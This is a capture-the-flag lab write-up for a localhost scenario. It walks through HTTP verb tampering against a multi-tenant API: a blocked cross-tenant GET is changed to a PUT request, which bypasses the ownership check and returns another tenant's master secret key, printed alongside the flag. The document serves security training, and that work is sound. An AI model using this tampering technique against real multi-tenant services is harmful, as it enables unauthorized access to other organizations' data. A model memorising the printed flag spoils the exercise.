# Scenario 19: RESTful HTTP Verb Tampering & Multi-Tenant IDOR

- **Port:** `8019`
- **Category:** Broken Object Level Authorization (IDOR / BOLA) / HTTP Verb Tampering
- **Difficulty:** Advanced
- **Flag:** `CTF{v3rb_t4mp3r1ng_t3n4nt_byp4ss}`
- **Target URL:** `http://localhost:8019/workspaces`

---

## Lab Description
This lab contains a multi-tenant authorization bypass vulnerability caused by incomplete HTTP verb access control enforcement on RESTful endpoints.

You belong to `tenant-12-carlos`. The sovereign high-value organization is `tenant-99-enterprise`.
Sending a standard `GET` request to `http://localhost:8019/api/workspaces/tenant-99-enterprise/settings` is intercepted by the API gateway filter and returns **403 Forbidden: Cross-tenant access denied**.

However, the backend developers failed to apply the cross-tenant ownership check to state-modifying HTTP methods (`PUT` and `PATCH`).

To solve this lab, use **Burp Suite** (or the embedded REST API console) to perform **HTTP Verb Tampering** by sending a `PUT` or `PATCH` request to the target enterprise workspace endpoint. The API will process the update and disclose the enterprise master secret key containing the CTF flag.

---

## Exploitation Walkthrough (Burp Suite Methodology)

### 1. Intercepting the Blocked GET Request
1. In your browser or Burp Suite, send a `GET` request to the target workspace settings:
   ```http
   GET /api/workspaces/tenant-99-enterprise/settings HTTP/1.1
   Host: localhost:8019
   ```
2. Observe the **403 Forbidden** security policy response:
   ```json
   {
     "success": false,
     "error": "403 Forbidden: Cross-tenant read access is strictly denied by the API Gateway Security Filter."
   }
   ```

### 2. Performing HTTP Verb Tampering
1. Send the request to **Burp Repeater** (`Ctrl + R`).
2. Change the HTTP method from `GET` to `PUT` (or `PATCH`).
3. Add a `Content-Type: application/json` header and a JSON payload body:
   ```http
   PUT /api/workspaces/tenant-99-enterprise/settings HTTP/1.1
   Host: localhost:8019
   Content-Type: application/json

   {
     "region": "us-west-2",
     "compliance_mode": "disabled"
   }
   ```
4. Click **Send**.

### 3. Flag Capture
1. The backend processes the `PUT` update and returns the full tenant object:
   ```json
   {
     "success": true,
     "message": "Workspace settings for 'tenant-99-enterprise' modified successfully via HTTP PUT.",
     "tenant": {
       "tenant_id": "tenant-99-enterprise",
       "org_name": "Apex Financial Global Corp",
       "master_secret_key": "CTF{v3rb_t4mp3r1ng_t3n4nt_byp4ss}"
     }
   }
   ```
2. Extract the CTF flag:
   ```text
   CTF{v3rb_t4mp3r1ng_t3n4nt_byp4ss}
   ```
